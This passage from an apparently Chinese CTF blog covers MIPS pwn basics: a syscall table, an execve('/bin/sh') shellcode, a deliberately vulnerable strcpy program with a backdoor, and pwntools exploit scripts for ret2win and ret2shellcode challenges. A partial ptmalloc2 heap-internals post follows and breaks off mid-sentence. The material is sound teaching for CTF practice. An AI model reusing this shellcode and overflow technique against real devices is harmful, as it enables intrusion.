ID</td></tr><tr><td>4024</td><td><code>ptrace</code></td><td>调试工具接口</td></tr><tr><td>4037</td><td><code>kill</code></td><td>向进程发送信号</td></tr><tr><td>4038</td><td><code>uname</code></td><td>获取系统信息</td></tr><tr><td>4040</td><td><code>mkdir</code></td><td>创建目录</td></tr><tr><td>4041</td><td><code>rmdir</code></td><td>删除目录</td></tr><tr><td>4042</td><td><code>dup</code></td><td>复制文件描述符</td></tr><tr><td>4045</td><td><code>brk</code></td><td>调整进程数据段的大小（分配堆内存）</td></tr><tr><td>4057</td><td><code>socket</code></td><td>创建套接字</td></tr><tr><td>4066</td><td><code>gettimeofday</code></td><td>获取时间和时区</td></tr><tr><td>4083</td><td><code>bind</code></td><td>绑定套接字</td></tr><tr><td>4085</td><td><code>listen</code></td><td>监听连接</td></tr><tr><td>4086</td><td><code>accept</code></td><td>接受连接</td></tr></tbody></table><h2 id="汇编Lab"><a href="#汇编Lab" class="headerlink" title="汇编Lab"></a>汇编Lab</h2><h3 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h3><p>我们通过编写经典程序 <code>Hello World</code> 作为我们 MIPS 汇编 Lab 的开始。</p><p>代码中 <code>.section</code> 用于定义段，我们用它定义了 <code>.text</code> 段和 <code>.data</code> 段。</p><p>我们声明了一个标签 <code>msg</code>，它是 <code>Hello World!</code> 的地址。</p><p><code>.asciiz</code> 用于定义一个以空字符结尾的字符串。</p><p><code>.set noreorder</code> 用于禁止指令重排序。</p><p><code>.global __start</code> 用于将 <code>__start</code> 定义为全局符号，是程序的入口点。我们通过 <code>__start</code> 告诉编译器，从这里开始执行代码。</p><p>然后我们通过设置 <code>write</code> 系统调用的参数最后触发中断输出 <code>Hello World!</code>。</p><p>然后通过执行 <code>exit</code> 系统调用让程序正常退出。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-class">.section</span> <span class="hljs-selector-class">.data</span><br><br>msg: <span class="hljs-selector-class">.asciiz</span> <span class="hljs-string">&quot;Hello World!&quot;</span><br><br><span class="hljs-selector-class">.section</span> <span class="hljs-selector-class">.text</span><br><span class="hljs-selector-class">.set</span> noreorder<br><span class="hljs-selector-class">.global</span> __start<br><br>__start:<br><br>la <span class="hljs-variable">$a0</span>,<span class="hljs-number">0</span><br>la <span class="hljs-variable">$a1</span>,msg<br>la <span class="hljs-variable">$a2</span>,<span class="hljs-number">13</span><br><span class="hljs-selector-tag">li</span> <span class="hljs-variable">$v0</span>,<span class="hljs-number">4004</span><br>syscall<br><br><span class="hljs-selector-tag">li</span> <span class="hljs-variable">$v0</span>,<span class="hljs-number">4001</span><br>syscall<br></code></pre></td></tr></table></figure><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>shellcode 即一段可以获取到 shell 的汇编代码。</p><p>这里我们通过 <code>execve</code> 系统调用执行 <code>/bin/sh</code> 获取一个 shell。</p><p>由于我们执行之后会直接弹出一个 shell，所以我们不需要使用 <code>exit</code> 让程序正常退出。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-class">.section</span> <span class="hljs-selector-class">.data</span><br>sh: <span class="hljs-selector-class">.asciiz</span> <span class="hljs-string">&quot;/bin/sh&quot;</span><br><br><span class="hljs-selector-class">.section</span> <span class="hljs-selector-class">.text</span><br><span class="hljs-selector-class">.global</span> __start<br><br><span class="hljs-selector-class">.set</span> noreorder<br><br>__start:<br>la <span class="hljs-variable">$a0</span>,sh<br><span class="hljs-selector-tag">li</span> <span class="hljs-variable">$a1</span>,<span class="hljs-number">0</span><br><span class="hljs-selector-tag">li</span> <span class="hljs-variable">$a2</span>,<span class="hljs-number">0</span><br><span class="hljs-selector-tag">li</span> <span class="hljs-variable">$v0</span>,<span class="hljs-number">4011</span><br>syscall<br></code></pre></td></tr></table></figure><p><img src="/assets/Pasted%20image%2020241127190813.png"></p><p>MIPS 在 pwn 中的特点：</p><ul><li>MIPS 不支持 NX 保护，所以 ret2shellcode 是最常见的利用方式</li><li>溢出控制<code>$ra</code>寄存器直接跳转到 shellcode 处</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br> <br><span class="hljs-type">void</span> <span class="hljs-title function_">backdoor</span><span class="hljs-params">()</span>&#123;<br>        system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br> <br><span class="hljs-type">void</span> <span class="hljs-title function_">has_stack</span><span class="hljs-params">(<span class="hljs-type">char</span> *src)</span><br>&#123;<br>        <span class="hljs-type">char</span> dst[<span class="hljs-number">20</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>        <span class="hljs-built_in">strcpy</span>(dst,src);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;copy successfully&quot;</span>);<br>&#125;<br> <br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>        has_stack(argv[<span class="hljs-number">1</span>]);<br> <br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译代码 mipsel-linux-gnu-gcc vuln.c -o vuln</p><p>动态调试 qemu-mipsel -g 8888 .&#x2F;vuln AAAAA</p><p>IDA连接上对应的进程，即可进行动态调试</p><p><img src="/assets/Pasted%20image%2020241209212922.png"></p><ol start="9"><li>MIPS32架构中是没有 EBP 寄存器的，程序函数调用的时候是将当前栈指针向下移动 n 比特到该函数的 stack frame 存储组空间，函数返回的时候再加上偏移量恢复栈。</li><li>传参过程中，前四个参数<code>a0-a3</code>，多余的会保存在调用函数的预留的栈顶空间内。</li><li>MIPS 调用函数时会把函数的返回地址直接存入<code>$RA</code>寄存器。</li></ol><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="ropemporium"><a href="#ropemporium" class="headerlink" title="ropemporium"></a>ropemporium</h3><p>wiki 上的一道简单题，很适合入门，只需要懂得 mips 汇编就行了。</p><p>事实上在 ida9 泄露之后，</p><p>ida 打开分析，进入<code>pwnme</code>关键函数。</p><p>函数开始将<code>ra</code>寄存器的值，放入<code>$sp+60</code>的位置里。即返回地址位于<code>$sp+60</code></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">addiu </span>  $<span class="hljs-built_in">sp</span>, -<span class="hljs-number">0x40</span><br><span class="hljs-keyword">sw </span>     $<span class="hljs-built_in">ra</span>, <span class="hljs-number">0x38</span>+var_s4($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">sw </span>     $<span class="hljs-built_in">fp</span>, <span class="hljs-number">0x38</span>+var_s0($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">move </span>   $<span class="hljs-built_in">fp</span>, $<span class="hljs-built_in">sp</span><br>li      $<span class="hljs-built_in">gp</span>, (_GLOBAL_OFFSET_TABLE_+<span class="hljs-number">0x7FF0</span>)<br><span class="hljs-keyword">sw </span>     $<span class="hljs-built_in">gp</span>, <span class="hljs-number">0x38</span>+var_28($<span class="hljs-built_in">sp</span>)<br>li      $<span class="hljs-built_in">a2</span>, <span class="hljs-number">0x20</span>  <span class="hljs-comment"># &#x27; &#x27;  # n</span><br><span class="hljs-keyword">move </span>   $<span class="hljs-built_in">a1</span>, $<span class="hljs-built_in">zero</span>       <span class="hljs-comment"># c</span><br><span class="hljs-keyword">addiu </span>  $<span class="hljs-built_in">v0</span>, $<span class="hljs-built_in">fp</span>, <span class="hljs-number">0x38</span>+var_20<br><span class="hljs-keyword">move </span>   $<span class="hljs-built_in">a0</span>, $<span class="hljs-built_in">v0</span>         <span class="hljs-comment"># s</span><br></code></pre></td></tr></table></figure><p>接下来看函数中的<code>read</code>函数，<code>a2</code>为读取的内容大小，将被复制为 0x38，<code>buf</code>为位于<code>$sp+0x18</code>的位置，明显的一个栈溢出漏洞，且能覆盖返回地址。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">gp</span>, <span class="hljs-number">0x38</span>+var_28($<span class="hljs-built_in">fp</span>)<br>li      $<span class="hljs-built_in">a2</span>, <span class="hljs-number">0x38</span>  <span class="hljs-comment"># &#x27;8&#x27;  # nbytes</span><br><span class="hljs-keyword">addiu </span>  $<span class="hljs-built_in">v0</span>, $<span class="hljs-built_in">fp</span>, <span class="hljs-number">0x38</span>+var_20<br><span class="hljs-keyword">move </span>   $<span class="hljs-built_in">a1</span>, $<span class="hljs-built_in">v0</span>         <span class="hljs-comment"># buf</span><br><span class="hljs-keyword">move </span>   $<span class="hljs-built_in">a0</span>, $<span class="hljs-built_in">zero</span>       <span class="hljs-comment"># fd</span><br>la      $<span class="hljs-built_in">v0</span>, read<br><span class="hljs-keyword">move </span>   $<span class="hljs-built_in">t9</span>, $<span class="hljs-built_in">v0</span><br><span class="hljs-keyword">jalr </span>   $<span class="hljs-built_in">t9</span> <span class="hljs-comment">; read</span><br></code></pre></td></tr></table></figure><p>通过计算，可以计算出填充的长度为 36。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">60</span>-<span class="hljs-number">0</span>x18=<span class="hljs-number">36</span><br></code></pre></td></tr></table></figure><p>然后我们在函数<code>ret2win</code>中发现了后门函数</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-symbol">ret2win:</span><br><br>var_8= -<span class="hljs-number">8</span><br>var_s0=  <span class="hljs-number">0</span><br>var_s4=  <span class="hljs-number">4</span><br><br><span class="hljs-keyword">addiu </span>  $<span class="hljs-built_in">sp</span>, -<span class="hljs-number">0x20</span><br><span class="hljs-keyword">sw </span>     $<span class="hljs-built_in">ra</span>, <span class="hljs-number">0x18</span>+var_s4($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">sw </span>     $<span class="hljs-built_in">fp</span>, <span class="hljs-number">0x18</span>+var_s0($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">move </span>   $<span class="hljs-built_in">fp</span>, $<span class="hljs-built_in">sp</span><br>li      $<span class="hljs-built_in">gp</span>, (_GLOBAL_OFFSET_TABLE_+<span class="hljs-number">0x7FF0</span>)<br><span class="hljs-keyword">sw </span>     $<span class="hljs-built_in">gp</span>, <span class="hljs-number">0x18</span>+var_8($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">lui </span>    $<span class="hljs-built_in">v0</span>, <span class="hljs-number">0x40</span>  <span class="hljs-comment"># &#x27;@&#x27;</span><br><span class="hljs-keyword">addiu </span>  $<span class="hljs-built_in">a0</span>, $<span class="hljs-built_in">v0</span>, (aWellDoneHereSY - <span class="hljs-number">0x400000</span>)  <span class="hljs-comment"># &quot;Well done! Here&#x27;s your flag:&quot;</span><br>la      $<span class="hljs-built_in">v0</span>, puts<br><span class="hljs-keyword">move </span>   $<span class="hljs-built_in">t9</span>, $<span class="hljs-built_in">v0</span><br><span class="hljs-keyword">jalr </span>   $<span class="hljs-built_in">t9</span> <span class="hljs-comment">; puts</span><br><span class="hljs-keyword">nop</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">gp</span>, <span class="hljs-number">0x18</span>+var_8($<span class="hljs-built_in">fp</span>)<br><span class="hljs-keyword">lui </span>    $<span class="hljs-built_in">v0</span>, <span class="hljs-number">0x40</span>  <span class="hljs-comment"># &#x27;@&#x27;</span><br><span class="hljs-keyword">addiu </span>  $<span class="hljs-built_in">a0</span>, $<span class="hljs-built_in">v0</span>, (aBinCatFlagTxt - <span class="hljs-number">0x400000</span>)  <span class="hljs-comment"># &quot;/bin/cat flag.txt&quot;</span><br>la      $<span class="hljs-built_in">v0</span>, system<br><span class="hljs-keyword">move </span>   $<span class="hljs-built_in">t9</span>, $<span class="hljs-built_in">v0</span><br><span class="hljs-keyword">jalr </span>   $<span class="hljs-built_in">t9</span> <span class="hljs-comment">; system</span><br><span class="hljs-keyword">nop</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">gp</span>, <span class="hljs-number">0x18</span>+var_8($<span class="hljs-built_in">fp</span>)<br><span class="hljs-keyword">nop</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">move </span>   $<span class="hljs-built_in">sp</span>, $<span class="hljs-built_in">fp</span><br><span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">ra</span>, <span class="hljs-number">0x18</span>+var_s4($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">fp</span>, <span class="hljs-number">0x18</span>+var_s0($<span class="hljs-built_in">sp</span>)<br><span class="hljs-keyword">addiu </span>  $<span class="hljs-built_in">sp</span>, <span class="hljs-number">0x20</span><br><span class="hljs-keyword">jr </span>     $<span class="hljs-built_in">ra</span><br><span class="hljs-keyword">nop</span><br></code></pre></td></tr></table></figure><p>所以我们可以通过栈溢出来将返回地址覆盖为<code>ret2win</code>函数的地址即可<code>cat flag</code></p><ul><li>exp</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch=<span class="hljs-string">&#x27;mips&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-comment">#设置加载mips架构程序的环境</span><br>io = process([<span class="hljs-string">&quot;qemu-mipsel&quot;</span>,<span class="hljs-string">&quot;-L&quot;</span>,<span class="hljs-string">&quot;/usr/mipsel-linux-gnu/&quot;</span>,<span class="hljs-string">&quot;./ret2win_mipsel&quot;</span>])<br>elf = ELF(<span class="hljs-string">&quot;./ret2win_mipsel&quot;</span>)<br>io.recv()<br>backdoor=<span class="hljs-number">0x0400a00</span><br>pay=<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">36</span>+p32(backdoor)<br>io.sendline(pay)<br>io.interactive()<br></code></pre></td></tr></table></figure><h3 id="axb-2019-mips"><a href="#axb-2019-mips" class="headerlink" title="axb_2019_mips"></a>axb_2019_mips</h3><ul><li>exp</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, word_size=<span class="hljs-number">32</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>io=process([<span class="hljs-string">&quot;qemu-mipsel&quot;</span>,<span class="hljs-string">&quot;-L&quot;</span>,<span class="hljs-string">&quot;/usr/mipsel-linux-gnu/&quot;</span>, <span class="hljs-string">&quot;./pwn2.pwn2&quot;</span>])<br><span class="hljs-comment">#io=process([&quot;qemu-mipsel&quot;,&quot;-g&quot;,&quot;1234&quot;,&quot;-L&quot;,&quot;/usr/mipsel-linux-gnu/&quot;, &quot;./pwn2.pwn2&quot;])</span><br><span class="hljs-comment">#qemu-mipsel -g 1234 -L /usr/mipsel-linux-gnu  ./pwn2.pwn2</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span><br>bss=<span class="hljs-number">0x410ba0</span><br>io.sendafter(<span class="hljs-string">&quot;What&#x27;s your name: \n&quot;</span>,payload)<br><br>shellcode = asm(shellcraft.mips.linux.sh(),arch=<span class="hljs-string">&#x27;mips&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p32(bss)+p32(<span class="hljs-number">0x4007e4</span>)<br>io.send(payload)<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x24</span>+p32(<span class="hljs-number">0x410be0</span>)+shellcode<br>io.send(payload)<br>io.interactive()            <br></code></pre></td></tr></table></figure><h3 id="Dasctf-shaopi"><a href="#Dasctf-shaopi" class="headerlink" title="Dasctf shaopi"></a>Dasctf shaopi</h3><p><a href="https://imlzh1.github.io/posts/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-%E8%B6%8A%E8%89%B0%E5%B7%A8-%E8%B6%8A%E7%8B%82%E7%83%AD-pwn-Writeups/#pwn-shaopi">2023DASCTF X 0psu3十一月挑战赛｜越艰巨·越狂热-pwn-Writeups | imLZH1’ Blog</a></p><p>ret2shellcode</p><h3 id="ycb-2020-mipspwn"><a href="#ycb-2020-mipspwn" class="headerlink" title="ycb_2020_mipspwn"></a>ycb_2020_mipspwn</h3><p>ret2shellcode</p><blockquote><p>参考：<a href="https://xz.aliyun.com/t/13294?time__1311=GqmxuD0DnDyAeGNeeequGEDknWwbxAI3x">MIPS PWN学习 - 先知社区</a><br>参考：<a href="https://zikh26.github.io/posts/919c29c4.html#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0">IOT安全入门学习–MIPS汇编基础 | ZIKH26’s Blog</a><br>参考：<a href="https://www.anquanke.com/post/id/202965#h2-5">MIPS 指令集 Shellcode 编写入门-安全客 - 安全资讯平台</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 异架构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ptmalloc2内存管理分析</title>
      <link href="/2025/07/01/ctf/heap/ptmalloc/"/>
      <url>/2025/07/01/ctf/heap/ptmalloc/</url>
      
        <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>各种平台有不同的内存分配器可用：</p><ul><li>dlmalloc – 通用分配器</li><li>Ptmalloc2 – glibc</li><li>jemalloc – FreeBSD 和 Firefox</li><li>tcmalloc – Google</li><li>libumem – Solaris</li></ul><p>历史上<a href="http://www.malloc.de/en/">ptmalloc2</a> 是从 <a href="http://g.oswego.edu/dl/html/malloc.html">dlmalloc</a> 派生而来的。在 fork 之后，添加了线程支持，并于 2006 年发布。在正式发布后，ptmalloc2 被集成到 glibc 源代码中。集成后，将直接对 glibc malloc 源代码本身进行代码更改。因此，ptmalloc2 和 glibc 的 malloc 实现之间可能会有很多变化。</p><p><img src="/assets/Pasted%20image%2020250411183214.png"></p><p><strong>线程：</strong> 在 Linux 的早期，dlmalloc 被用作默认内存分配器。但后来由于 ptmalloc2 的多线程支持，它成为 linux 的默认内存分配器。线程支持有助于提高内存分配器性能，从而提高应用程序性能。在 dlmalloc 中，当两个线程同时调用 malloc 时，只有一个线程可以进入关键部分，因为空闲列表数据结构在所有可用线程之间共享。因此，在多线程应用程序中，内存分配需要时间，从而导致性能下降。而在 ptmalloc2 中，当两个线程同时调用 malloc 时，会立即分配内存，因为每个线程都维护一个单独的堆段，因此维护这些堆的自由列表数据结构也是独立的。这种为每个线程维护单独的堆和空闲列表数据结构的行为称为 <strong>per thread arena</strong>。</p><ul><li>静态内存管理</li></ul><p>静态内存管理是指在编译时确定内存分配，并且内存分配的大小和生命周期在程序运行时保持不变。比如我们编程时的静态变量和全局变量就属于静态内存管理，好处是快速，缺点是不够灵活。</p><ul><li>动态内存管理</li></ul><p>在程序运行过程中，堆可以提供动态分配的内存，允许程序申请大小未知的内存。堆其实就是程序虚拟地址空间的一块连续的线性区域，它由低地址向高地址方向增长。我们一般称管理堆的那部分程序为堆管理。</p><ul><li>一块内存</li><li>几种数据结构</li><li>一些安全机制</li><li>动态分配和回收</li><li>提高利用率</li><li>减少碎片化</li></ul><p>堆管理器处于用户程序与内核中间，主要做以下工作</p><ol><li>响应用户的申请内存请求，向操作系统申请内存，然后将其返回给用户程序。同时，为了保持内存管理的高效性，内核一般都会预先分配很大的一块连续的内存，然后让堆管理器通过某种算法管理这块内存。只有当出现了堆空间不足的情况，堆管理器才会再次与操作系统进行交互。</li><li>管理用户所释放的内存。一般来说，用户释放的内存并不是直接返还给操作系统的，而是由堆管理器进行管理。这些释放的内存可以用来响应新申请的内存的请求。</li></ol><p><img src="/assets/Pasted%20image%2020250330115151.png"></p><p><img src="/assets/Pasted%20image%2020250330115205.png"></p><p>第一个malloc完成的时候，top chunk就存在了。</p><p>top chunk包含arena扩容的部分，不属于任何bin</p><p><img src="/assets/Pasted%20image%2020250330115231.png"></p><p><img src="/assets/Pasted%20image%2020250330115251.png"></p><p><img src="/assets/Pasted%20image%2020250330115326.png"></p><p><img src="/assets/Pasted%20image%2020250330115428.png"></p><p><img src="/assets/Pasted%20image%2020250330115440.png"></p><p><img src="/assets/Pasted%20image%2020250330115451.png"></p><p><img src="/assets/Pasted%20image%2020250330115500.png"></p><p><img src="/assets/Pasted%20image%2020250330115512.png"></p><p><img src="/assets/Pasted%20image%2020250330115524.png"></p><p><img src="/assets/Pasted%20image%2020250330115537.png"></p><p><img src="/assets/Pasted%20image%2020250330115549.png"></p><p><img src="/assets/Pasted%20image%2020250330115603.png"></p><p>动态内存管理是指在程序运行时根据需要进行内存分配和释放，由程序员显式管理。这个最显著的例子就是我们的<code>malloc</code>和<code>free</code>函数。好处是灵活，缺点是复杂。</p><p>我们在编写 C 语言程序时<code>malloc</code>一块内存是由堆管理器（ptmalloc）分配了一块内存给我们使用，<code>malloc</code>返回的是指向那块内存的指针。</p><p>例如下面的代码，会将<code>malloc</code>分配的内存地址保存在<code>ptr</code>指针中，我们通过<code>ptr</code>指针来使用这块内存。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> *ptr=(<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br></code></pre></td></tr></table></figure><p><code>malloc</code>通过 ptmalloc 向我们分配这块内存，而内存分配多少是由 ptmalloc 的分配机制来决定的。</p><h2 id="内存布局"><a href="#内存布局" class="headerlink" title="内存布局"></a>内存布局</h2><ul><li>32位程序经典内存布局：<ul><li>最高地址的 1G 内存空间属于内核空间不能使用。</li><li>内核空间以下的空间属于栈，栈自顶向下增长，最大大小为 8M</li><li>栈以下便是<code>mmap</code>区域，空间向上增长，和栈相对。</li><li><code>heap</code>段自底向上增长。</li><li>剩下的空间属于可执行文件空间，即<code>bss</code>段、<code>data</code>段、<code>text</code>段</li></ul></li></ul><p><img src="/../assets/Pasted%20image%2020241105124201.png"></p><ul><li>64位程序经典内存布局：<ul><li>最高地址的 128TB 内存空间属于内核空间不能使用。</li><li>内核空间以下的空间属于栈，栈自顶向下增长，最大大小为 8M</li><li>栈以下便是<code>mmap</code>区域，空间向上增长，和栈相对。</li><li><code>heap</code>段自底向上增长。</li><li>剩下的空间属于可执行文件空间，即<code>bss</code>段、<code>data</code>段、<code>text</code>段</li></ul></li></ul><p>![[..&#x2F;..&#x2F;..&#x2F;RE&#x2F;assets&#x2F;assets&#x2F;Pasted image 20240630112911.png]]</p><h2 id="C语言内存操作函数"><a href="#C语言内存操作函数" class="headerlink" title="C语言内存操作函数"></a>C语言内存操作函数</h2><ul><li><code>malloc</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span>* <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span>;<br></code></pre></td></tr></table></figure><ul><li><code>realloc</code></li></ul><p>如果<code>ptr</code>为空，则<code>realloc</code>的行为类似于<code>malloc</code>。如果<code>size</code>为0，则它的行为类似于<code>free</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span>* <span class="hljs-title function_">realloc</span><span class="hljs-params">(<span class="hljs-type">void</span>* ptr, <span class="hljs-type">size_t</span> size)</span>;<br></code></pre></td></tr></table></figure><ul><li><code>calloc</code></li></ul><p>与<code>malloc</code>不同的是，<code>calloc</code>分配的内存会自动清零。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span>* <span class="hljs-title function_">calloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> num, <span class="hljs-type">size_t</span> size)</span>;<br></code></pre></td></tr></table></figure><ul><li><code>free</code></li></ul><p>释放由<code>malloc</code>、<code>calloc</code>或<code>realloc</code>分配的内存块。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">free</span><span class="hljs-params">(<span class="hljs-type">void</span>* ptr)</span>;<br></code></pre></td></tr></table></figure><h2 id="内存分配背后的系统调用"><a href="#内存分配背后的系统调用" class="headerlink" title="内存分配背后的系统调用"></a>内存分配背后的系统调用</h2><h3 id="brk和sbrk"><a href="#brk和sbrk" class="headerlink" title="brk和sbrk"></a>brk和sbrk</h3><p><code>brk</code>是系统调用，<code>sbrk</code>为库函数。系统调用负责提供一种最小功能，而库函数则提供比较复杂的功能。<code>malloc</code>函数族就是调用<code>sbrk</code>函数将数据段的下界移动分配内存。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">brk</span><span class="hljs-params">(<span class="hljs-type">void</span> *end_data_segment)</span>;<br><span class="hljs-type">void</span> *<span class="hljs-title function_">sbrk</span><span class="hljs-params">(<span class="hljs-type">intptr_t</span> increment)</span>;<br></code></pre></td></tr></table></figure><h3 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h3><p><code>mmap</code>函数在 Linux 